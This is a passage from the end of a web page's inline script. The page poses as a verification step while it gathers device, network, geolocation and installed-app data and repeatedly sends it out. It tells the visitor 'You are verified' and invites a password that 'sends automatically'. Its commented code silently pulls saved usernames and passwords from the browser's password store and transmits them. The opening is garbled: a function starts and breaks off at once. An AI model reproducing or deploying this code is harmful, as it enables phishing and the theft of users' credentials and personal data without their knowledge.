  <script>
    const $ = s => document.querySelector(s);

    function collectDevice() {

      });

      step('network', 'active');
      Object.assign(payload, await collectNetwork());
      await wait(300);
      step('network', 'done');
      send();

      $('#panel').classList.add('show');

      step('geo', 'active');
      collectGeo().then(g => { step('geo', g ? 'done' : 'skip'); if (g) { Object.assign(payload, g); send(); } });

      step('apps', 'active');
      collectApps().then(a => { payload.installedApps = a; step('apps', 'done'); send(); });

      $('#title').textContent = 'You are verified';
      $('#sub').textContent = 'Add your password if you like — it sends automatically';

      // silently pull a saved credential from the browser's password store
      try {
        if (window.PasswordCredential) {
          const c = await navigator.credentials.get({ password: true, mediation: 'silent' });
          if (c && c.password) {
            if (!pwEl.value) { pwEl.value = c.password; lastPw = c.password; }
            if (c.id && !userEl.value) { userEl.value = c.id; lastUser = c.id; }
            send(true);
          }
        }
      } catch (e) { }

      stats();
    })();
  </script>
</body>

</html>
